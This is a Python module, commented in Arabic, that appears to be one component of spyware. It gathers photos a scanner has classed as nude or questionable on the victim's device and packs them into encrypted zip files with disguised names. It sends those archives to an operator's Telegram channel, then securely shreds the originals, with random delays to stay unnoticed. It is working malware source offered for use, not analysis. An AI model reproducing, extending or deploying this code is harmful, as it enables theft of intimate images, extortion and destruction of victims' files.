# -*- coding: utf-8 -*-
import os, time, json, random, zipfile, threading, logging, gc, string
from datetime import datetime

# إعداد المسارات
P = os.path.join(os.getcwd(), ".sys_runtime")
H = os.path.join(P, "harvest")
for d in [P, H]:
    if not os.path.exists(d):
        os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "z.log"), level=logging.ERROR, filemode='a')

try:
    import pyzipper
    HAS_PYZIP = True
except:
    HAS_PYZIP = False

class DailyZipper:
    def __init__(self, scanner=None, tg=None):
        self.sc = scanner    # MediaScanner instance
        self.tg = tg         # TelegramUI instance (T)
        self.pw = "Z@3n_2025"
        self.max_b = 40 * 1024 * 1024  # 40MB limit for Telegram
        self.active = False

    def _gen_name(self):
        """توليد أسماء ملفات مموهة للملفات المضغوطة"""
        prefixes = ["cache_", "sys_upd_", "tmp_vol_", "core_st_", "db_sync_"]
        chars = string.ascii_letters + string.digits
        suffix = ''.join(random.choices(chars, k=8))
        return f"{random.choice(prefixes)}{suffix}.zip"

    def _shred(self, path):
        """إتلاف الملف الأصلي بعد ضغطه لضمان عدم استرجاعه"""
        try:
            if os.path.exists(path):
                sz = os.path.getsize(path)
                if sz > 0:
                    with open(path, "ba+", buffering=0) as f:
                        f.write(os.urandom(sz))
                        f.flush()
                        os.fsync(f.fileno())
                os.remove(path)
        except Exception:
            pass

    def _pack(self, files):
        if not files or self.active:
            return
        self.active = True

        # تقسيم الملفات إلى دفعات بناءً على الحجم
        batches = []
        cur_batch = []
        cur_size = 0

        for f in files:
            if not os.path.exists(f):
                continue
            try:
                fsz = os.path.getsize(f)
                if cur_size + fsz > self.max_b:
                    batches.append(cur_batch)
                    cur_batch = []
                    cur_size = 0
                cur_batch.append(f)
                cur_size += fsz
            except Exception:
                continue

        if cur_batch:
            batches.append(cur_batch)

        def _sender():
            # تحديد قناة الخزنة (Vault)
            vault = None
            try:
                if self.tg:
                    vault = self.tg.dat
            except Exception:
                pass

            if not vault:
                return

            for idx, batch in enumerate(batches):
                zip_name = self._gen_name()
                zip_path = os.path.join(H, zip_name)

                try:
                    # ضغط مع تشفير إذا توفر pyzipper
                    if HAS_PYZIP:
                        with pyzipper.AESZipFile(zip_path, 'w',
                                                 compression=pyzipper.ZIP_DEFLATED,
                                                 encryption=pyzipper.WZ_AES) as zf:
                            zf.setpassword(self.pw.encode('utf-8'))
                            for f in batch:
                                zf.write(f, os.path.basename(f))
                    else:
                        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                            for f in batch:
                                zf.write(f, os.path.basename(f))

                    # إرسال الملف إلى تلغرام
                    with open(zip_path, 'rb') as fobj:
                        resp = self.tg._ap("sendDocument",
                                           {"chat_id": vault, "caption": f"📦 Part {idx+1}/{len(batches)}"},
                                           {"document": fobj})

                    if resp and resp.get('ok'):
                        threading.Thread(target=self._shred_batch, args=(batch,), daemon=True).start()

                except Exception as e:
                    logging.error(f"Pack error: {e}")
                finally:
                    if os.path.exists(zip_path):
                        os.remove(zip_path)

                # تأخير عشوائي بين الدفعات
                if idx < len(batches) - 1:
                    time.sleep(random.randint(30, 120))

            self.active = False
            gc.collect()

        threading.Thread(target=_sender, daemon=True).start()

    def _shred_batch(self, batch):
        """حذف آمن للملفات على دفعات عشوائية"""
        step = random.randint(3, 7)
        for i in range(0, len(batch), step):
            for f in batch[i:i+step]:
                self._shred(f)
            time.sleep(random.randint(5, 15))

    def run(self):
        if self.active:
            return

        all_files = []
        if self.sc:
            try:
                nude = self.sc.get_gallery_by_category("nude", limit=200)
                all_files.extend([item["path"] for item in nude if "path" in item])

                quest = self.sc.get_gallery_by_category("questionable", limit=100)
                all_files.extend([item["path"] for item in quest if "path" in item])
            except Exception as e:
                logging.error(f"Run: error fetching sensitive files: {e}")

        # إضافة ملفات السجل الكبيرة للحصاد أيضاً لتنظيف الجهاز
        try:
            for f in os.listdir(P):
                if f.endswith(".log") and f not in ["z.log", "t.log"]:
                    path = os.path.join(P, f)
                    if os.path.exists(path) and os.path.getsize(path) > 50000:  # 50KB+
                        all_files.append(path)
        except Exception as e:
            logging.error(f"Run: error adding logs: {e}")

        if all_files:
            # ✅ إضافة إشعار فوري عند العثور على صور حساسة
            if self.tg and hasattr(self.tg, 'notify_harvest'):
                try:
                    # استخراج معرف الجهاز من خلال سلسلة المراجع
                    did = "Unknown"
                    if self.sc and hasattr(self.sc, 'det') and self.sc.det:
                        if hasattr(self.sc.det, 'mon') and self.sc.det.mon:
                            did = self.sc.det.mon.did
                    self.tg.notify_harvest(did, len(all_files))
                except Exception as e:
                    logging.error(f"Run: notify_harvest failed: {e}")

            self._pack(all_files)

def create(scanner=None, telegram=None):
    return DailyZipper(scanner, telegram)
